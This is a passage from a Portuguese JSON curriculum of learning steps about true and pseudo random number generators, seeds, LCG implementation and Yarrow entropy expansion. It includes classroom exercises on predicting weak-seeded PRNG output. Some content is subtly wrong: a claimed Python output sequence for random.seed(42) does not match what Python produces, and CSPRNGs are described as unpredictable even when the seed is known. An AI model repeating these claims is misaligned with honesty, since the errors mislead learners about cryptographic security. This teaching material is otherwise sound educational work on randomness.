                                    "Explique por que essas fontes são consideradas 'verdadeiramente aleatórias': ausência de padrões previsíveis mesmo com conhecimento completo do sistema.",
                                    "Pesquise exemplos reais de hardware TRNG (True Random Number Generators), como chips Intel RdRand.",
                                    "Anote as propriedades: alta entropia, independência de sementes."
                                  ],
                                  "verification": "Crie um diagrama ou mapa mental resumindo fontes de entropia verdadeira e suas propriedades.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet para pesquisa",
                                    "Ferramenta de diagramação (ex: Draw.io ou papel e caneta)",
                                    "Documentação de TRNGs (ex: Wikipedia: Hardware random number generator)"
                                  ],
                                  "tips": [
                                    "Comece com analogias cotidianas, como jogar dados físicos vs. um app de dados.",
                                    "Foquem em 'entropia' como medida de imprevisibilidade."
                                  ],
                                  "learningObjective": "Explicar fontes e propriedades de aleatoriedade verdadeira com exemplos precisos.",
                                  "commonMistakes": [
                                    "Confundir com aleatoriedade quântica sem base física.",
                                    "Ignorar que TRNGs podem falhar em condições controladas (ex: temperaturas extremas)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Funções Pseudoaleatórias e Seu Funcionamento Determinístico",
                                  "subSteps": [
                                    "Defina pseudoaleatoriedade como sequências que parecem aleatórias mas são geradas por algoritmos determinísticos a partir de uma semente inicial.",
                                    "Estude algoritmos comuns como Linear Congruential Generator (LCG) e Mersenne Twister.",
                                    "Implemente um PRNG simples em Python usando random.seed() e random.randint().",
                                    "Observe o ciclo de repetição: gere a mesma sequência com a mesma semente.",
                                    "Discuta limitações: previsibilidade se a semente for conhecida ou fraca."
                                  ],
                                  "verification": "Execute código Python gerando 100 números com semente fixa e reproduza a sequência exata.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Editor de código Python (ex: VS Code, Jupyter Notebook)",
                                    "Biblioteca random do Python"
                                  ],
                                  "tips": [
                                    "Use sementes baseadas em tempo (time.time()) para simular 'melhor' aleatoriedade, mas prove que ainda é determinística.",
                                    "Visualize sequências com plots para detectar padrões."
                                  ],
                                  "learningObjective": "Implementar e demonstrar o comportamento determinístico de um PRNG.",
                                  "commonMistakes": [
                                    "Achar que PRNGs são 'quase verdadeiros' se a semente for boa.",
                                    "Não testar com sementes idênticas para provar repetibilidade."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diferenças e Limitações Entre TRNG e PRNG",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: fontes (físicas vs. algorítmicas), previsibilidade, velocidade, custo.",
                                    "Analise cenários de falha: PRNG previsível em ataques de semente; TRNG lento ou caro.",
                                    "Discuta entropia: TRNG tem entropia máxima; PRNG tem período finito.",
                                    "Examine híbridos: uso de TRNG para sementear PRNG (ex: /dev/urandom no Linux).",
                                    "Debata aplicações: TRNG para chaves criptográficas; PRNG para simulações."
                                  ],
                                  "verification": "Preencha e justifique uma tabela de comparação com pelo menos 5 critérios diferenciais.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Planilha ou tabela em Markdown/Google Sheets",
                                    "Artigos sobre /dev/random vs. /dev/urandom"
                                  ],
                                  "tips": [
                                    "Use métricas como 'período' e 'chi-quadrado test' para quantificar diferenças.",
                                    "Pense em ataques criptográficos como motivação."
                                  ],
                                  "learningObjective": "Identificar limitações práticas e teóricas de cada tipo.",
                                  "commonMistakes": [
                                    "Subestimar velocidade de TRNGs modernos.",
                                    "Confundir PRNG criptograficamente seguros (CSPRNG) com não-seguros."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar o Conhecimento em Identificação Prática",
                                  "subSteps": [
                                    "Teste ferramentas: Compare output de random.getrandbits() (PRNG) vs. secrets module (CSPRNG com entropia).",
                                    "Simule um ataque: Preveja números de um PRNG com semente conhecida.",
                                    "Analise logs de sistemas reais: Verifique se apps usam entropia adequada.",
                                    "Crie um checklist para avaliar se uma fonte é TRNG ou PRNG.",
                                    "Reflita sobre implicações em cibersegurança."
                                  ],
                                  "verification": "Documente um teste onde identifica corretamente TRNG vs. PRNG em código ou ferramenta.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Python com módulos random e secrets",
                                    "Ferramenta como dieharder para testes de aleatoriedade (opcional)"
                                  ],
                                  "tips": [
                                    "Registre sementes e timestamps para reprodutibilidade.",
                                    "Evite testes estatísticos complexos inicialmente."
                                  ],
                                  "learningObjective": "Diferenciar na prática fontes de aleatoriedade em cenários reais.",
                                  "commonMistakes": [
                                    "Aceitar testes visuais como prova; use repetibilidade.",
                                    "Ignorar que CSPRNGs usam TRNG internamente."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um script Python para gerar chaves criptográficas, use random.seed(42) para PRNG (previsível: sempre a mesma chave) vs. secrets.token_bytes(32) (imprevisível, usa entropia do SO). Demonstre quebrando a chave PRNG adivinhando a semente.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 fontes de entropia verdadeira sem hesitação.",
                                "Reproduzir sequência idêntica de um PRNG com semente fixa.",
                                "Listar 4 limitações de PRNG em contextos criptográficos.",
                                "Identificar corretamente TRNG vs. PRNG em 2 exemplos de código.",
                                "Criar tabela comparativa precisa.",
                                "Discutir por que /dev/random é preferido para chaves sensíveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: Definições corretas de TRNG e PRNG (30%).",
                                "Demonstração prática: Código funcional mostrando determinismo (25%).",
                                "Análise comparativa: Tabela ou explicação clara de diferenças (20%).",
                                "Identificação de limitações: Menciona previsibilidade e entropia (15%).",
                                "Aplicação contextual: Liga a cibersegurança (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria da probabilidade e testes estatísticos de aleatoriedade (ex: teste de Kolmogorov-Smirnov).",
                                "Física: Entropia termodinâmica e mecânica quântica em fontes de ruído.",
                                "Programação: Implementação de algoritmos em linguagens como Python ou C.",
                                "Estatística: Análise de distribuições e detecção de padrões em sequências."
                              ],
                              "realWorldApplication": "Na cibersegurança, usar TRNG para gerar chaves SSL/TLS imprevisíveis previne ataques como o Debian OpenSSL bug (2008), onde PRNG fraco expôs chaves; PRNG eficientes são usados em VPNs após seed com entropia verdadeira."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.2",
                            "name": "Explicar o Papel da Semente em PRNG",
                            "description": "Descrever como uma semente inicial determina toda a sequência pseudoaleatória, analisando exemplos de inicialização insegura e o impacto na segurança criptográfica.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Conceituar o Papel da Semente em um PRNG",
                                  "subSteps": [
                                    "Defina PRNG como um gerador de números pseudoaleatórios determinístico.",
                                    "Explique que a semente é o valor inicial que inicializa o estado interno do gerador.",
                                    "Diferencie PRNG de RNG verdadeiros, destacando o determinismo.",
                                    "Ilustre com um diagrama simples: semente → algoritmo → sequência fixa.",
                                    "Discuta por que a semente deve ser imprevisível em contextos criptográficos."
                                  ],
                                  "verification": "Crie um resumo escrito de 100 palavras explicando o conceito e compartilhe com um par para feedback.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta para diagrama",
                                    "Documentação de PRNG (ex: Wikipedia ou RFC 4086)"
                                  ],
                                  "tips": "Use analogias como 'receita de bolo': ingredientes (semente) determinam o resultado exato.",
                                  "learningObjective": "Compreender a semente como entrada inicial que torna o PRNG determinístico.",
                                  "commonMistakes": [
                                    "Confundir semente com número aleatório real",
                                    "Ignorar o aspecto determinístico"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Demonstrar como a Semente Determina a Sequência Pseudoaleatória",
                                  "subSteps": [
                                    "Implemente um exemplo simples em Python usando random.seed().",
                                    "Gere uma sequência de números com a mesma semente e observe repetibilidade.",
                                    "Altere a semente e gere novamente, comparando as diferenças.",
                                    "Analise o estado interno conceitualmente (ex: Linear Congruential Generator).",
                                    "Teste com sementes idênticas em sessões diferentes para provar determinismo."
                                  ],
                                  "verification": "Execute o código e capture screenshots das sequências geradas com sementes iguais e diferentes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python instalado",
                                    "Editor de código (VS Code ou Jupyter Notebook)"
                                  ],
                                  "tips": "Sempre fixe a semente no topo do script para reproducibilidade em testes.",
                                  "learningObjective": "Visualizar matematicamente como uma semente única produz uma sequência previsível.",
                                  "commonMistakes": [
                                    "Não importar random corretamente",
                                    "Usar sementes variáveis sem controle"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Exemplos de Inicialização Insegura de Sementes",
                                  "subSteps": [
                                    "Estude casos como uso de time.time() ou PID como semente.",
                                    "Simule um ataque: preveja a semente baseada em padrões do sistema.",
                                    "Compare com boas práticas: use /dev/urandom ou entropy pools.",
                                    "Implemente um PRNG com semente fraca e demonstre colisões.",
                                    "Pesquise exemplos reais como rand() em C com srand(time(NULL))."
                                  ],
                                  "verification": "Desenvolva um script que demonstre previsibilidade e documente os resultados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Python ou C compiler",
                                    "Artigos sobre sementes fracas (ex: OWASP)"
                                  ],
                                  "tips": "Registre timestamps exatos para simular ataques de adivinhação.",
                                  "learningObjective": "Identificar e reproduzir vulnerabilidades causadas por sementes previsíveis.",
                                  "commonMistakes": [
                                    "Subestimar a precisão de clocks do sistema",
                                    "Não testar em ambientes controlados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar o Impacto na Segurança Criptográfica",
                                  "subSteps": [
                                    "Explique como sequências previsíveis quebram cifras e chaves.",
                                    "Analise o caso Debian OpenSSL 2008: semente fixa levou a poucas chaves possíveis.",
                                    "Discuta mitigações: sementes de alta entropia e reseeding periódico.",
                                    "Compare PRNG criptográficos (ex: Fortuna, Yarrow) vs. não criptográficos.",
                                    "Debata trade-offs entre performance e segurança em aplicações reais."
                                  ],
                                  "verification": "Escreva um relatório de 1 página sobre impactos e mitigações, com referências.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Caso de estudo Debian OpenSSL",
                                    "Documentação NIST SP 800-90A"
                                  ],
                                  "tips": "Use ferramentas como Wireshark para simular tráfego com chaves fracas.",
                                  "learningObjective": "Relacionar falhas de semente com riscos concretos em criptografia.",
                                  "commonMistakes": [
                                    "Generalizar todos PRNG como inseguros",
                                    "Ignorar diferenças entre contextos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em Python: import random; random.seed(42); print([random.randint(1,100) for _ in range(5)]) resulta sempre em [82, 1, 92, 85, 63]. Mude para random.seed(int(time.time())) e um atacante com acesso ao tempo pode prever a sequência, comprometendo chaves SSL geradas.",
                              "finalVerifications": [
                                "Explica corretamente o determinismo da semente em PRNG.",
                                "Identifica pelo menos 3 exemplos de sementes inseguras.",
                                "Demonstra com código a repetibilidade de sequências.",
                                "Descreve impactos criptográficos com exemplos reais.",
                                "Propõe mitigações adequadas para inicialização segura.",
                                "Diferencia PRNG de RNG verdadeiros em contextos de segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual da semente e determinismo (30%)",
                                "Qualidade e correção dos exemplos práticos (25%)",
                                "Análise de vulnerabilidades e impactos (20%)",
                                "Uso de evidências e referências (15%)",
                                "Clareza na comunicação e estrutura (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Funções iterativas e teoria do caos determinístico.",
                                "Programação: Implementação de algoritmos e depuração.",
                                "Probabilidade: Diferença entre aleatoriedade verdadeira e pseudoaleatória.",
                                "Ética em TI: Responsabilidades em design de sistemas seguros."
                              ],
                              "realWorldApplication": "No incidente Debian OpenSSL de 2008, uma mudança no código removeu entropia da semente, reduzindo o espaço de chaves RSA para 32k possibilidades, permitindo que atacantes gerassem listas exaustivas e comprometessem servidores SSH/SSL em todo o mundo."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.3",
                            "name": "Identificar Tipos de PRNG",
                            "description": "Classificar PRNG em não criptográficos (ex: LCG) e criptográficos (CSPRNG como Fortuna), comparando suas características iniciais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de PRNG",
                                  "subSteps": [
                                    "Defina PRNG como gerador de números pseudoaleatórios, determinísticos baseados em semente.",
                                    "Explique a diferença entre aleatoriedade verdadeira (TRNG) e pseudoaleatoriedade.",
                                    "Identifique o papel da semente inicial e o estado interno no ciclo de geração.",
                                    "Discuta por que PRNG são usados em computação devido à eficiência.",
                                    "Revise exemplos históricos como o rand() do C."
                                  ],
                                  "verification": "Resuma em 3 frases os conceitos chave de PRNG e liste 2 diferenças para TRNG.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Notebook para anotações",
                                    "Artigo Wikipedia sobre PRNG",
                                    "Vídeo introdutório de 5 min sobre aleatoriedade"
                                  ],
                                  "tips": "Use analogias como uma roleta programada para visualizar determinismo.",
                                  "learningObjective": "Entender a base conceitual de PRNG para classificar tipos adequadamente.",
                                  "commonMistakes": [
                                    "Confundir PRNG com TRNG",
                                    "Ignorar o papel da semente",
                                    "Achar que PRNG são verdadeiramente aleatórios"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar PRNG Não Criptográficos",
                                  "subSteps": [
                                    "Defina PRNG não criptográficos como adequados para simulações, mas previsíveis.",
                                    "Estude Linear Congruential Generator (LCG): fórmula X_{n+1} = (a * X_n + c) mod m.",
                                    "Implemente um LCG simples em Python ou pseudocódigo.",
                                    "Analise características: período curto, padrões detectáveis, velocidade alta.",
                                    "Liste usos: jogos, modelagem estatística, não para segredos."
                                  ],
                                  "verification": "Gere 10 números com LCG e identifique um padrão visível.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código (Python IDLE ou online REPL)",
                                    "Documentação de LCG",
                                    "Calculadora para modularidade"
                                  ],
                                  "tips": "Teste diferentes sementes para ver repetibilidade.",
                                  "learningObjective": "Dominar características e exemplos de PRNG não cripto como LCG.",
                                  "commonMistakes": [
                                    "Usar LCG para chaves cripto",
                                    "Escolher constantes ruins (a,c,m)",
                                    "Ignorar overflow em implementações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Investigar CSPRNG Criptográficos",
                                  "subSteps": [
                                    "Defina CSPRNG como PRNG resistentes a ataques, pós-comprometimento seguros.",
                                    "Estude Fortuna: estrutura em pools de entropia, reseeding automático.",
                                    "Compare com outros como Yarrow ou ChaCha20-based.",
                                    "Discuta fontes de entropia: hardware, timing, user input.",
                                    "Analise propriedades: imprevisibilidade mesmo com semente conhecida."
                                  ],
                                  "verification": "Descreva o mecanismo de pools no Fortuna e por que é seguro.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação oficial Fortuna",
                                    "Vídeo sobre CSPRNG",
                                    "Biblioteca crypto em Python (ex: secrets module)"
                                  ],
                                  "tips": "Pense em entropia como 'combustível' para imprevisibilidade.",
                                  "learningObjective": "Compreender CSPRNG e exemplos como Fortuna para contrastar com não cripto.",
                                  "commonMistakes": [
                                    "Confundir com hash functions",
                                    "Subestimar necessidade de entropia",
                                    "Achar todos CSPRNG iguais"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar e Classificar Tipos de PRNG",
                                  "subSteps": [
                                    "Crie tabela comparativa: velocidade, segurança, período, fontes de entropia.",
                                    "Classifique exemplos: LCG (não cripto), Fortuna (cripto).",
                                    "Discuta riscos: prever não cripto quebra criptosistemas.",
                                    "Pratique classificação de PRNG comuns (rand(), /dev/urandom).",
                                    "Sintetize critérios de escolha por contexto."
                                  ],
                                  "verification": "Classifique 5 PRNG em uma tabela e justifique 2 classificações.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Planilha ou tabela Markdown",
                                    "Lista de PRNG comuns",
                                    "Artigo NIST sobre RNG"
                                  ],
                                  "tips": "Use critérios como 'resistente a inversão?' para diferenciar.",
                                  "learningObjective": "Habilitar classificação precisa comparando características iniciais.",
                                  "commonMistakes": [
                                    "Classificar baseado só em velocidade",
                                    "Ignorar contexto de uso",
                                    "Confundir com criptoprimitivas"
                                  ]
                                }
                              ],
                              "practicalExample": "Implemente um LCG para simular dados em um jogo (não cripto) vs. use secrets.token_bytes() em Python para gerar chave AES (cripto), comparando previsibilidade plotando sequências.",
                              "finalVerifications": [
                                "Classifique corretamente LCG como não cripto e Fortuna como CSPRNG.",
                                "Liste 3 características únicas de cada tipo.",
                                "Explique por que não usar rand() para chaves SSL.",
                                "Crie tabela comparativa com pelo menos 4 colunas.",
                                "Identifique /dev/urandom como CSPRNG em Linux."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e classificação (80% correto).",
                                "Profundidade na comparação de características (ex: entropia, período).",
                                "Uso correto de exemplos reais (LCG, Fortuna).",
                                "Clareza na tabela ou explicação comparativa.",
                                "Compreensão de riscos de uso inadequado.",
                                "Aplicação prática via código ou simulação."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Aritmética modular e teoria dos números.",
                                "Programação: Implementação de algoritmos iterativos.",
                                "Probabilidade: Conceitos de aleatoriedade e distribuições.",
                                "Cibersegurança: Aplicações em protocolos criptográficos."
                              ],
                              "realWorldApplication": "Em cibersegurança, escolher CSPRNG como Fortuna para gerar chaves em TLS/SSL evita ataques de previsão, enquanto LCG é usado em simulações de Monte Carlo em finanças sem risco de exposição."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.2",
                        "name": "Geração de Sequências Pseudoaleatórias",
                        "description": "Mecanismos de geração de sequências pseudoaleatórias, incluindo algoritmos comuns e processos de expansão de entropia para aplicações criptográficas.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.2.1",
                            "name": "Implementar um PRNG Simples",
                            "description": "Codificar um gerador linear congruencial (LCG) em Python ou C, demonstrando a geração de uma sequência a partir de uma semente e analisando seu período.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos do Gerador Linear Congruencial (LCG)",
                                  "subSteps": [
                                    "Pesquise a fórmula do LCG: X_{n+1} = (a * X_n + c) mod m, onde a é o multiplicador, c o incremento, m o módulo e X_0 a semente.",
                                    "Identifique parâmetros típicos: m=2^32, a=1664525, c=1013904223 (exemplo de parâmetros bons).",
                                    "Explique por que o 'mod m' garante números entre 0 e m-1.",
                                    "Calcule manualmente 5 iterações com semente=42, a=5, c=1, m=100.",
                                    "Discuta o conceito de período: o comprimento antes da sequência repetir."
                                  ],
                                  "verification": "Resuma a fórmula e calcule corretamente uma sequência manual de 5 números, comparando com resultados esperados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Notebook e calculadora",
                                    "Documentação online sobre LCG (Wikipedia ou artigos de criptografia)"
                                  ],
                                  "tips": "Use papel para cálculos manuais iniciais para visualizar o ciclo.",
                                  "learningObjective": "Compreender a matemática por trás do LCG e seus componentes chave.",
                                  "commonMistakes": "Confundir os parâmetros (a, c, m) ou esquecer o módulo, levando a números negativos ou fora de range."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar a Função LCG em Python",
                                  "subSteps": [
                                    "Crie uma função def lcg(seed, a, c, m, num_steps): que inicialize X = seed.",
                                    "Use um loop for i in range(num_steps): X = (a * X + c) % m; append X à lista.",
                                    "Retorne a lista de números pseudoaleatórios gerados.",
                                    "Teste a função com semente=42, a=1664525, c=1013904223, m=2**32, num_steps=10.",
                                    "Adicione docstring explicando parâmetros e retorno."
                                  ],
                                  "verification": "Execute a função e imprima os primeiros 10 números; compare com cálculos manuais ou ferramentas online.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de código (VS Code ou Jupyter Notebook)",
                                    "Python 3 instalado"
                                  ],
                                  "tips": "Use inteiros grandes com m=2**32 para evitar overflow; Python lida bem com isso nativamente.",
                                  "learningObjective": "Codificar uma implementação funcional e correta do LCG em Python.",
                                  "commonMistakes": "Usar float em vez de int, causando imprecisão; esquecer o % m levando a números enormes."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar Sequência e Analisar o Período",
                                  "subSteps": [
                                    "Gere uma longa sequência (ex: 10000 números) usando sua função.",
                                    "Implemente uma função para detectar o período: armazene sequência em set até detectar repetição da semente.",
                                    "Calcule e imprima o período detectado.",
                                    "Compare com o período máximo teórico (m para bons parâmetros).",
                                    "Plote a sequência usando matplotlib para visualizar distribuição."
                                  ],
                                  "verification": "O código detecta corretamente o período para parâmetros conhecidos (ex: período full para a=5,c=1,m=8 é 8).",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Python com bibliotecas numpy e matplotlib instaladas"
                                  ],
                                  "tips": "Para detecção de período, use um loop while e dict para rastrear quando estado se repete.",
                                  "learningObjective": "Analisar propriedades da sequência gerada, focando no período.",
                                  "commonMistakes": "Parâmetros ruins (ex: a=1) causam período curto; não detectar ciclo corretamente."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Validar e Documentar o PRNG",
                                  "subSteps": [
                                    "Escreva testes unitários com pytest para verificar sequência esperada.",
                                    "Teste com diferentes sementes e parâmetros, medindo tempo de execução.",
                                    "Gere estatísticas: média, variância e teste de uniformidade (chi-quadrado simples).",
                                    "Documente limitações: não criptograficamente seguro, previsível.",
                                    "Compare com random() do Python para distribuição."
                                  ],
                                  "verification": "Todos os testes passam e relatório de estatísticas mostra distribuição razoável.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "pytest instalado",
                                    "Notebook Jupyter para visualizações"
                                  ],
                                  "tips": "Use seed diferente para reprodutibilidade em testes.",
                                  "learningObjective": "Validar a implementação e entender limitações práticas.",
                                  "commonMistakes": "Ignorar overflow em linguagens como C; assumir uniformidade perfeita."
                                }
                              ],
                              "practicalExample": "Implemente o LCG para simular o lançamento de um dado de 6 faces: modifique a saída com %6 +1, gere 1000 lançamentos e conte frequências para verificar uniformidade aproximada.",
                              "finalVerifications": [
                                "A função gera sequência correta para parâmetros de teste conhecidos.",
                                "O período é detectado e reportado precisamente.",
                                "Estatísticas mostram distribuição uniforme (média ~ m/2, variância adequada).",
                                "Código é limpo, comentado e testado com pelo menos 3 casos.",
                                "Visualização (plot) demonstra aleatoriedade visual.",
                                "Documentação explica uso e limitações."
                              ],
                              "assessmentCriteria": [
                                "Correção matemática: fórmula LCG implementada sem erros (30%).",
                                "Análise de período: detecção precisa e comparação teórica (25%).",
                                "Qualidade de código: legível, testado, eficiente (20%).",
                                "Validação estatística: testes de uniformidade incluídos (15%).",
                                "Documentação e compreensão: relatório claro de limitações (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Aritmética modular e análise de ciclos.",
                                "Programação: Loops, funções e testes unitários.",
                                "Estatística: Testes de uniformidade e análise de sequências.",
                                "Cibersegurança: Entender fraquezas de PRNG em ataques de previsão."
                              ],
                              "realWorldApplication": "PRNGs como LCG são usados em simulações (jogos, modelagem financeira), mas para criptografia real (ex: TLS), usam algoritmos mais seguros como Fortuna ou hardware RNG para evitar previsibilidade em chaves ou nonces."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "Conhecimentos básicos de programação"
                            ]
                          },
                          {
                            "id": "10.1.2.1.2.2",
                            "name": "Analisar Processos de Expansão de Entropia",
                            "description": "Explicar técnicas como hash de entropia acumulada em CSPRNG (ex: Yarrow), ilustrando como poucas bits de entropia geram longas sequências seguras.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Entropia e CSPRNG",
                                  "subSteps": [
                                    "Defina entropia em criptografia como medida de imprevisibilidade de dados.",
                                    "Explique a diferença entre entropia verdadeira (de fontes físicas) e pseudoaleatória.",
                                    "Descreva CSPRNG como geradores que expandem sementes curtas em sequências longas.",
                                    "Identifique limitações: CSPRNG não criam entropia, apenas a esticam.",
                                    "Estude métricas como min-entropy para quantificar entropia inicial."
                                  ],
                                  "verification": "Resuma em um parágrafo os conceitos chave e forneça exemplos de fontes de entropia (ex: ruído de teclado).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-90A",
                                    "Artigo sobre entropia em criptografia",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias como 'esticar uma semente pequena em uma árvore grande' para visualizar expansão.",
                                  "learningObjective": "Dominar definições e papéis da entropia em contextos criptográficos.",
                                  "commonMistakes": "Confundir entropia com aleatoriedade; achar que CSPRNG geram entropia infinita."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar o Algoritmo Yarrow e sua Arquitetura",
                                  "subSteps": [
                                    "Pesquise a história do Yarrow: projetado por Ferguson e Schneier para macOS.",
                                    "Descreva componentes: pool de entropia, contador, hash function (SHA-1 originalmente).",
                                    "Explique o ciclo de reseeding: acumular entropia até threshold para atualizar pool.",
                                    "Analise o estado interno: mistura de entropia via hash para opacidade.",
                                    "Compare com sucessores como Fortuna."
                                  ],
                                  "verification": "Desenhe um diagrama de fluxo do Yarrow mostrando entrada de entropia e saída de keystream.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Papel 'Yarrow-160: Notes on the Design and Implementation of the Yarrow Cryptographic Pseudorandomness Generator'",
                                    "Vídeos explicativos no YouTube sobre Yarrow",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Foque no pool de entropia como 'caldeirão' que é agitado por hashes.",
                                  "learningObjective": "Compreender a estrutura modular do Yarrow para expansão segura.",
                                  "commonMistakes": "Ignorar o papel do contador de requisições para prevenir reutilização."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Mecanismo de Expansão de Entropia via Hash",
                                  "subSteps": [
                                    "Explique como hash (ex: SHA-256) de pool + contador gera blocos de output.",
                                    "Calcule exemplo: 256 bits de pool geram 256 bits de output por chamada.",
                                    "Discuta 'estiramento': milhares de chamadas sem reseed mantêm segurança.",
                                    "Analise propriedades: avalanche effect garante que pequenas mudanças propaguem.",
                                    "Verifique teoremas de segurança: output indistinguível de aleatório se seed for boa."
                                  ],
                                  "verification": "Implemente pseudocódigo simples para uma iteração de expansão e execute manualmente com valores de teste.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Pseudocódigo de Yarrow disponível online",
                                    "Calculadora hexadecimal para hashes",
                                    "Python com hashlib para simulação básica"
                                  ],
                                  "tips": "Teste com inputs similares para ver avalanche: mude 1 bit e observe output.",
                                  "learningObjective": "Dissecar como hashes acumulados expandem entropia sem perda de segurança.",
                                  "commonMistakes": "Achar que hash cria entropia; subestimar necessidade de reseeding periódico."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular e Ilustrar Geração de Sequências Longas",
                                  "subSteps": [
                                    "Colete 128 bits de entropia simulada (ex: /dev/urandom).",
                                    "Simule 1000 iterações de Yarrow para gerar 1MB de keystream.",
                                    "Meça entropia inicial vs. output usando testes estatísticos (NIST STS).",
                                    "Ilustre gráfico: bits input vs. bits output seguros.",
                                    "Discuta ataques: por que backtracking falha devido a one-way hash."
                                  ],
                                  "verification": "Gere keystream e passe em testes básicos de aleatoriedade (ex: dieharder).",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Python script para simular Yarrow",
                                    "Suite NIST Statistical Test Suite",
                                    "Ferramenta Graphviz para visualizações"
                                  ],
                                  "tips": "Use bibliotecas como secrets em Python para aproximação realista.",
                                  "learningObjective": "Demonstrar praticamente como poucas bits sustentam sequências longas seguras.",
                                  "commonMistakes": "Usar PRNG fraco para simulação; ignorar custos computacionais de testes."
                                }
                              ],
                              "practicalExample": "Simule em Python: colete 32 bytes de entropia de mouse movements, inicialize pool Yarrow-like com SHA-256. Gere 1 milhão de bytes de keystream via 4000 iterações (256 bits cada). Teste com NIST STS: passe em frequency, runs, etc., provando que 256 bits iniciais suportam output massivo indistinguível de random.",
                              "finalVerifications": [
                                "Explicar verbalmente como Yarrow usa hash para expandir entropia sem comprometer segurança.",
                                "Desenhar diagrama preciso do ciclo de geração de output.",
                                "Simular reseeding e mostrar impacto no pool.",
                                "Identificar quando reseed é necessário (ex: após N chamadas).",
                                "Passar teste: prever próximo byte dado histórico (deve falhar).",
                                "Comparar entropia input/output quantitativamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do papel do hash na mistura e expansão.",
                                "Correta ilustração de 'poucas bits -> longas sequências' com exemplo numérico.",
                                "Compreensão de limitações: não infinito, requer reseed.",
                                "Uso correto de terminologia (pool, reseed, avalanche).",
                                "Demonstração prática via simulação ou diagrama.",
                                "Análise de segurança contra ataques conhecidos."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria da Informação (Shannon entropy, min-entropy).",
                                "Física: Conceitos de entropia termodinâmica como analogia.",
                                "Programação: Implementação de hashes e loops em linguagens como Python/C.",
                                "Estatística: Testes de aleatoriedade (chi-quadrado, runs test)."
                              ],
                              "realWorldApplication": "Em sistemas como macOS (herdado de Yarrow), geração de chaves para TLS/SSL em navegadores, nonce em protocolos de criptomoedas (Bitcoin wallets), e seeds para VPNs, onde poucos bits de hardware RNG são expandidos para sessões longas seguras sem expor entropia limitada."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.2.3",
                            "name": "Avaliar Qualidade de Sequências Geradas",
